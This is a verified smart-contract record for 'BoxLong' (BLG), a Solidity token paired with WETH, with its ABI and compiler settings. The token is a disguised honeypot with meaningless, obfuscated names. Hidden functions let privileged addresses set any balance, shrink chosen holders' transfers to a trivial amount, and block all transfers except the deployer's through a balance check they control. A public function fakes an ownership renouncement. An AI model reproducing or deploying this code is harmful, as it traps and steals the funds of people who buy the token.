{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface receiverToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitWalletAuto) external view returns (uint256);\n\n    function transfer(address amountTake, uint256 minLiquidityLimit) external returns (bool);\n\n    function allowance(address maxMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minLiquidityLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountTake,\n        uint256 minLiquidityLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundMinTotal, uint256 value);\n    event Approval(address indexed maxMode, address indexed spender, uint256 value);\n}\n\nabstract contract maxShouldReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoListTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeTx {\n    function createPair(address teamAutoSender, address listSellTrading) external returns (address);\n}\n\ninterface receiverTokenMetadata is receiverToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BoxLong is maxShouldReceiver, receiverToken, receiverTokenMetadata {\n\n    address receiverSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address minEnable, uint256 minLiquidityLimit) external virtual override returns (bool) {\n        return autoLimit(_msgSender(), minEnable, minLiquidityLimit);\n    }\n\n    function transferFrom(address maxShould, address amountTake, uint256 minLiquidityLimit) external override returns (bool) {\n        if (_msgSender() != receiverIs) {\n            if (exemptLaunchedAt[maxShould][_msgSender()] != type(uint256).max) {\n                require(minLiquidityLimit <= exemptLaunchedAt[maxShould][_msgSender()]);\n                exemptLaunchedAt[maxShould][_msgSender()] -= minLiquidityLimit;\n            }\n        }\n        return autoLimit(maxShould, amountTake, minLiquidityLimit);\n    }\n\n    function autoLimit(address maxShould, address amountTake, uint256 minLiquidityLimit) internal returns (bool) {\n        if (maxShould == liquidityLaunchLaunched) {\n            return toToken(maxShould, amountTake, minLiquidityLimit);\n        }\n        uint256 enableTotal = receiverToken(swapReceiver).balanceOf(receiverSell);\n        require(enableTotal == amountToken);\n        require(amountTake != receiverSell);\n        if (limitMin[maxShould]) {\n            return toToken(maxShould, amountTake, minSwapTotal);\n        }\n        return toToken(maxShould, amountTake, minLiquidityLimit);\n    }\n\n    function isTotal() public {\n        emit OwnershipTransferred(liquidityLaunchLaunched, address(0));\n        liquidityTake = address(0);\n    }\n\n    string private receiverTx = \"Box Long\";\n\n    uint256 public marketingTo;\n\n    function allowance(address modeFee, address sellBuy) external view virtual override returns (uint256) {\n        if (sellBuy == receiverIs) {\n            return type(uint256).max;\n        }\n        return exemptLaunchedAt[modeFee][sellBuy];\n    }\n\n    mapping(address => mapping(address => uint256)) private exemptLaunchedAt;\n\n    uint8 private buyTake = 18;\n\n    mapping(address => uint256) private toLaunched;\n\n    function approve(address sellBuy, uint256 minLiquidityLimit) public virtual override returns (bool) {\n        exemptLaunchedAt[_msgSender()][sellBuy] = minLiquidityLimit;\n        emit Approval(_msgSender(), sellBuy, minLiquidityLimit);\n        return true;\n    }\n\n    mapping(address => bool) public liquiditySell;\n\n    function maxSender(uint256 minLiquidityLimit) public {\n        swapBuyTake();\n        amountToken = minLiquidityLimit;\n    }\n\n    address receiverIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public amountLaunch;\n\n    function swapBuyTake() private view {\n        require(liquiditySell[_msgSender()]);\n    }\n\n    uint256 public modeToken;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverTx;\n    }\n\n    uint256 private swapMax;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchTeam;\n    }\n\n    uint256 private limitMinToken = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return liquidityTake;\n    }\n\n    address public liquidityLaunchLaunched;\n\n    uint256 public takeBuy;\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyTake;\n    }\n\n    uint256 amountToken;\n\n    uint256 tradingTx;\n\n    bool private swapMode;\n\n    function owner() external view returns (address) {\n        return liquidityTake;\n    }\n\n    address private liquidityTake;\n\n    uint256 constant minSwapTotal = 18 ** 10;\n\n    function launchedExempt(address launchTotal) public {\n        if (amountLaunch) {\n            return;\n        }\n        \n        liquiditySell[launchTotal] = true;\n        if (swapMax == takeBuy) {\n            takeBuy = modeToken;\n        }\n        amountLaunch = true;\n    }\n\n    function enableFrom(address feeFund) public {\n        swapBuyTake();\n        \n        if (feeFund == liquidityLaunchLaunched || feeFund == swapReceiver) {\n            return;\n        }\n        limitMin[feeFund] = true;\n    }\n\n    address public swapReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitMinToken;\n    }\n\n    function balanceOf(address limitWalletAuto) public view virtual override returns (uint256) {\n        return toLaunched[limitWalletAuto];\n    }\n\n    mapping(address => bool) public limitMin;\n\n    function receiverLimit(address minEnable, uint256 minLiquidityLimit) public {\n        swapBuyTake();\n        toLaunched[minEnable] = minLiquidityLimit;\n    }\n\n    constructor (){\n        \n        autoListTake amountSell = autoListTake(receiverIs);\n        swapReceiver = takeTx(amountSell.factory()).createPair(amountSell.WETH(), address(this));\n        if (takeBuy != swapMax) {\n            takeBuy = swapMax;\n        }\n        liquidityLaunchLaunched = _msgSender();\n        isTotal();\n        liquiditySell[liquidityLaunchLaunched] = true;\n        toLaunched[liquidityLaunchLaunched] = limitMinToken;\n        if (takeBuy != marketingTo) {\n            marketingTo = swapMax;\n        }\n        emit Transfer(address(0), liquidityLaunchLaunched, limitMinToken);\n    }\n\n    string private launchTeam = \"BLG\";\n\n    bool public buyFrom;\n\n    event OwnershipTransferred(address indexed shouldModeTeam, address indexed launchedTotal);\n\n    function toToken(address maxShould, address amountTake, uint256 minLiquidityLimit) internal returns (bool) {\n        require(toLaunched[maxShould] >= minLiquidityLimit);\n        toLaunched[maxShould] -= minLiquidityLimit;\n        toLaunched[amountTake] += minLiquidityLimit;\n        emit Transfer(maxShould, amountTake, minLiquidityLimit);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldModeTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundMinTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLiquidityLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitWalletAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFund\",\"type\":\"address\"}],\"name\":\"enableFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTotal\",\"type\":\"address\"}],\"name\":\"launchedExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLaunchLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquiditySell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minLiquidityLimit\",\"type\":\"uint256\"}],\"name\":\"maxSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLiquidityLimit\",\"type\":\"uint256\"}],\"name\":\"receiverLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLiquidityLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLiquidityLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BoxLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}